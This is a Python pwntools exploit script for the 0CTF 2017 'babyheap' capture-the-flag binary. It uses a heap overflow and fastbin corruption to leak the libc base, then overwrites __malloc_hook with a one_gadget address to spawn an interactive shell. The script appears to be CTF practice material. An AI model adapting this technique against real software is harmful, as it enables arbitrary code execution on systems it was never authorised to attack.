from pwn import *

# pdbg = pwn_debug('babyheap_0ctf_2017')
# pdbg.remote('node3.buuoj.cn',26076)
p = process('babyheap_0ctf_2017')

def allocate(size):
	p.recvuntil('Command: ')
	p.sendline('1')
	p.recvuntil('Size: ')
	p.sendline(str(size))

def fill(idx,content):
	p.recvuntil('Command: ')
	p.sendline('2')
	p.recvuntil('Index: ')
	p.sendline(str(idx))
	p.recvuntil('Size: ')
	p.sendline(str(len(content)))
	p.recvuntil('Content: ')
	p.send(content)

def free(idx):
	p.recvuntil('Command: ')
	p.sendline('3')
	p.recvuntil('Index: ')
	p.sendline(str(idx))

def dump(idx):
	p.recvuntil('Command: ')
	p.sendline('4')
	p.recvuntil('Index: ')
	p.sendline(str(idx))
	p.recvline()
	return p.recvline()

allocate(0x10)
allocate(0x10)
allocate(0x10)
allocate(0x10)
allocate(0x80)
free(1)
free(2)

#gdb.attach(p)

payload = p64(0) * 3
payload += p64(0x21)
payload += p64(0) * 3
payload += p64(0x21)
payload += p8(0x80)
fill(0,payload)

#gdb.attach(p)

payload = p64(0) * 3
payload += p64(0x21)
fill(3,payload)

#gdb.attach(p)

allocate(0x10)
allocate(0x10)
fill(1,'aaaa')
fill(2,'bbbb')
payload = p64(0) * 3
payload += p64(0x91)
fill(3,payload)
allocate(0x80)
free(4)

libc_base = u64(dump(2)[:8].strip().ljust(8, "\x00"))-0x3c4b78
log.info("libc_base: "+hex(libc_base))

allocate(0x60)
free(4)
payload = p64(libc_base+0x3c4aed)
fill(2, payload)

allocate(0x60)
allocate(0x60)
 
payload = p8(0)*3
payload += p64(0)*2
payload += p64(libc_base+0x4527a)
fill(6, payload)

#gdb.attach(p)

allocate(255)

p.interactive()

